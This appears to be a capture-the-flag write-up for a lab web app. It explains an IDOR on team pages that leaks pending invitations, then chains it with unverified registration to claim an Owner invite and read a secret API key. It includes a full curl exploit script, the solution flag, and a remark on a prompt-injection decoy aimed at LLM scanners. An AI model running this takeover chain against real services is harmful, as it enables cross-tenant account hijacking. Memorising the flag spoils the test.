# Writeup: [Partner] teamforge

## Flag

`KubSTU{21509994fd5a1383bfb6b4c4d85b4cf0}`

## Bug — IDOR on `/org/<id>/team` + email-bound invitation acceptance

The login dashboard hands a Member account a single `Beta Labs` org (id=2). The
team page leaks pending-invitation emails (the source even calls it out:
`<!-- VULNERABLE: Email addresses are visible! -->`). The intended invite for
`newdev@beta.com` in Beta Labs is only `Member`, so re-registering with that
address gives nothing useful.

Authorization on `/org/<id>` is per-org *except* for `/org/<id>/team`, which
forgets the membership check. Walking through `/org/1/team` … `/org/N/team`
exposes every team's members **and** pending invitations across the whole
platform, including roles. `Acme Corp` (id=1) had an unaccepted **Owner**
invite for `victoria.chase@acme.com`.

Combined with `/register` not requiring email verification ("No verification
required - your account will be active immediately!"), the path is:

1. Logged in as the throwaway Member, hit `/org/1/team` (cross-tenant IDOR) →
   read pending invite for `victoria.chase@acme.com`, role `Owner`.
2. Logout, register a new account with that exact email.
3. New account's `/invitations` page now shows the Owner invite waiting.
4. Accept it → become **Owner of Acme Corp**.
5. `/org/1/settings/security` is now reachable; the Master API Key is the
   flag.

```bash
BASE='https://3758486a-afe0-4c9a-9982-6cc979d0ba95.labs.hackadvisor.io'

# 1) Authenticate as the seeded Member.
curl -sS -c j.txt -X POST "$BASE/login" \
    --data-urlencode 'email=user@test.com' --data-urlencode 'password=password123'

# 2) Cross-tenant IDOR: leak pending Owner invite from Acme Corp.
curl -sS -b j.txt "$BASE/org/1/team" |
    grep -B1 'badge bg-purple' | grep -oE '[a-z.]+@[a-z]+\.[a-z]+'
# → victoria.chase@acme.com

# 3) Logout + register as that email (no verification).
curl -sS -X POST "$BASE/register" \
    --data-urlencode 'username=victoria' \
    --data-urlencode 'email=victoria.chase@acme.com' \
    --data-urlencode 'password=Pwn123!' -c v.txt

# 4) Accept the matching Owner invite.
INV=$(curl -sS -b v.txt "$BASE/invitations" |
      grep -oE 'invitations/[0-9a-f-]+/accept' | head -1 | cut -d/ -f2)
curl -sS -b v.txt -X POST "$BASE/invitations/$INV/accept"

# 5) Read the flag from /org/1/settings/security.
curl -sS -b v.txt "$BASE/org/1/settings/security" |
    grep -oE 'KubSTU\{[^}]+\}' | head -1
# → KubSTU{21509994fd5a1383bfb6b4c4d85b4cf0}
```

## Notes

- The pages are sprinkled with a prompt-injection decoy
  `FLAG{d3c0y_n0t_r34l_7r4p_f0r_b0ts}` aimed at LLM scanners that grep for
  `FLAG{}` in HTML; ignore it.
- Description says the flag format is `FLAG{...}` but the actual flag in the
  Master API Key field is `KubSTU{...}`. The challenge platform accepts
  `KubSTU{21509994fd5a1383bfb6b4c4d85b4cf0}`.
- The `/org/<id>/team` IDOR is the real bug; trying mass-assignment on
  `/invitations/<id>/accept`, role-array parameter pollution, email-case
  account takeover (`Alex@beta.com` vs `alex@beta.com`), and re-accepting a
  consumed invite all return 404/Member — the platform validates the
  invitation's pre-set role.
